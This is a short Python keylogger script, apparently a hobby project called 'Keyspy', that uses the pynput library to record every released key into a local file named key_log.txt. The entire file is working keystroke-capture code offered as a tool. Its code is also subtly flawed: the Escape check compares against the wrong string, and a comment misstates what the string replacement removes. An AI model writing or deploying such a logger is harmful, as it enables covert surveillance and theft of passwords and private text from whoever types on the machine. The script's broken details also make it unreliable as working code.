from pynput import  keyboard# import keyboard module from pynput library , allows you to montor and control input devices
print('\033[91m' + """_   __                                 
| | / /                                 
| |/ /  ___ _   _ ___ _ __   __ _ _   _ 
|    \ / _ \ | | / __| '_ \ / _` | | | |
| |\  \  __/ |_| \__ \ |_) | (_| | |_| |
\_| \_/\___|\__, |___/ .__/ \__,_|\__, |
             __/ |   | |           __/ |
            |___/    |_|          |___/""" + '\033[0m')



print("#Created by mohamed mehanna ")
f = open("key_log.txt","a") # open file in the append mode , "a" paramter if the file doesnt exist , that will create a file to store the keyword
f.write("\n\nnew session started\n") #this line writes new followed by the text new session start
f.close() # this line closes the file after the session start message

def on_release(key):
    st="" # to store the captured keyword
    st+=str(key).replace(",","") # coverts the key object to string , remove any single qoutes

    if (str(key) == "key.esc"): # check if the keystrokes include 'esc' key , if it is , that will return false that make the program stop
        return False
    f=open("key_log.txt","a") # open the file again
    f.write(st) # that line writes the captured stroked in st variable
    f.close() # the file will close after the keystrokes is written

with keyboard.Listener(on_release=on_release) as listener:
    listener.join()

